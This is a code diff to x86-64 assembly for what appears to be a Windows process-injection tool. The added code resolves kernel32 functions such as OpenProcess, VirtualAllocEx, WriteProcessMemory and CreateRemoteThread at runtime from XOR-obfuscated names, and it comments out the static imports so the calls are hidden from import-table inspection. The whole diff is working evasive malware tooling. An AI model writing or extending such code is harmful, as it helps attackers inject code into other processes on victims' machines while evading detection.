@@ -1,7 +1,7 @@
 section .text
 
-extern GetStdHandle
-extern WriteFile
+; extern GetStdHandle
+; extern WriteFile
 
 ; arg0: dst         rcx
 ; arg1: src         rdx
@@ -799,9 +799,44 @@ get_proc_address_by_name:
     leave
     ret
 
+
+; arg0: base addr               rcx
+; arg1: proc name               rdx
+; arg2: proc name len           r8
+;
+; return: proc addr             rax
+get_proc_address_by_get_proc_addr:
+    push rbp
+    mov rbp, rsp
+
+    mov [rbp + 16], rcx         ; base addr
+    mov [rbp + 24], rdx         ; proc name
+    mov [rbp + 32], r8          ; proc name len
+
+    ; [rbp - 8] = return value
+    ; 8 bytes padding
+    sub rsp, 16                 ; allocate local variable space
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, [rbp + 24]
+    call [get_proc_addr_addr]   ; proc addr
+    add rsp, 32
+
+    mov [rbp - 8], rax          ; return value
+
+.shutdown:
+    add rsp, 16                 ; free local variable space
+
+    mov rax, [rbp - 8]          ; return value
+
+    leave
+    ret
+
 ; arg0: base addr               rcx
 ; arg1: xor str                 rdx
 ; arg2: xor str len             r8
+; arg3: is get proc addr        r9
 ;
 ; return: proc addr             rax
 unxor_and_get_proc_addr:
@@ -811,6 +846,7 @@ unxor_and_get_proc_addr:
     mov [rbp + 16], rcx         ; base addr
     mov [rbp + 24], rdx         ; xor str
     mov [rbp + 32], r8          ; xor str len
+    mov [rbp + 40], r9          ; is get proc addr
 
     ; [rbp - 8] = return value
     ; 8 bytes padding
@@ -824,18 +860,32 @@ unxor_and_get_proc_addr:
     call my_xor
     add rsp, 32
 
+    cmp qword [rbp + 40], 1                   ; is get proc addr
+    jne .not_get_proc_addr
+        sub rsp, 32
+        mov rcx, [rbp + 16]
+        mov rdx, [rbp + 24]
+        mov r8, [rbp + 32]
+        call get_proc_address_by_name
+        add rsp, 32
+
+        mov [rbp - 8], rax          ; proc addr
+
+        jmp .shutdown
+
+.not_get_proc_addr:
     sub rsp, 32
     mov rcx, [rbp + 16]
     mov rdx, [rbp + 24]
     mov r8, [rbp + 32]
-    call get_proc_address_by_name
+    call get_proc_address_by_get_proc_addr
     add rsp, 32
 
     mov [rbp - 8], rax          ; proc addr
 
-    add rsp, 16                 ; free local variable space
-
 .shutdown:
+
+    add rsp, 16                 ; free local variable space
     mov rax, [rbp - 8]          ; return value
 
     leave
@@ -850,8 +900,28 @@ populate_kernel_function_ptrs_by_name:
 
     sub rsp, 32
     mov rcx, [rbp + 16]
+    mov rdx, get_proc_addr_xor
+    mov r8, get_proc_addr_xor.len
+    mov r9, 1
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [get_proc_addr_addr], rax           ; GetProcAddress addr
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, get_last_error_xor
+    mov r8, get_last_error_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [get_last_error_addr], rax          ; GetLastError addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
     mov rdx, loadlibrary_xor
     mov r8, loadlibrary_xor.len
+    xor r9, r9
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
@@ -861,6 +931,7 @@ populate_kernel_function_ptrs_by_name:
     mov rcx, [rbp + 16]
     mov rdx, open_process_xor
     mov r8, open_process_xor.len
+    xor r9, r9
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
@@ -870,6 +941,7 @@ populate_kernel_function_ptrs_by_name:
     mov rcx, [rbp + 16]
     mov rdx, virtual_alloc_ex_xor
     mov r8, virtual_alloc_ex_xor.len
+    xor r9, r9
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
@@ -877,8 +949,19 @@ populate_kernel_function_ptrs_by_name:
 
     sub rsp, 32
     mov rcx, [rbp + 16]
+    mov rdx, virtual_free_ex_xor
+    mov r8, virtual_free_ex_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [virtual_free_ex_addr], rax         ; VirtualFreeEx addr
+
+    sub rsp, 32
+    mov rcx, [rbp + 16]
     mov rdx, virtual_protect_ex_xor
     mov r8, virtual_protect_ex_xor.len
+    xor r9, r9
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
@@ -888,6 +971,7 @@ populate_kernel_function_ptrs_by_name:
     mov rcx, [rbp + 16]
     mov rdx, create_remote_thread_xor
     mov r8, create_remote_thread_xor.len
+    xor r9, r9
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
@@ -897,6 +981,7 @@ populate_kernel_function_ptrs_by_name:
     mov rcx, [rbp + 16]
     mov rdx, wait_for_single_object_xor
     mov r8, wait_for_single_object_xor.len
+    xor r9, r9
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
@@ -906,6 +991,7 @@ populate_kernel_function_ptrs_by_name:
     mov rcx, [rbp + 16]
     mov rdx, close_handle_xor
     mov r8, close_handle_xor.len
+    xor r9, r9
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
@@ -915,6 +1001,7 @@ populate_kernel_function_ptrs_by_name:
     mov rcx, [rbp + 16]
     mov rdx, create_toolhelp32_snapshot_xor
     mov r8, create_toolhelp32_snapshot_xor.len
+    xor r9, r9
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
@@ -924,6 +1011,7 @@ populate_kernel_function_ptrs_by_name:
     mov rcx, [rbp + 16]
     mov rdx, process32_first_xor
     mov r8, process32_first_xor.len
+    xor r9, r9
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
@@ -933,6 +1021,7 @@ populate_kernel_function_ptrs_by_name:
     mov rcx, [rbp + 16]
     mov rdx, process32_next_xor
     mov r8, process32_next_xor.len
+    xor r9, r9
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
@@ -942,11 +1031,22 @@ populate_kernel_function_ptrs_by_name:
     mov rcx, [rbp + 16]
     mov rdx, sleep_xor
     mov r8, sleep_xor.len
+    xor r9, r9
     call unxor_and_get_proc_addr            ; proc addr
     add rsp, 32
 
     mov [sleep_addr], rax                   ; Sleep addr
 
+    sub rsp, 32
+    mov rcx, [rbp + 16]
+    mov rdx, write_process_memory_xor
+    mov r8, write_process_memory_xor.len
+    xor r9, r9
+    call unxor_and_get_proc_addr            ; proc addr
+    add rsp, 32
+
+    mov [write_process_memory_addr], rax    ; WriteProcessMemory addr
+    
 .shutdown:
     leave
     ret
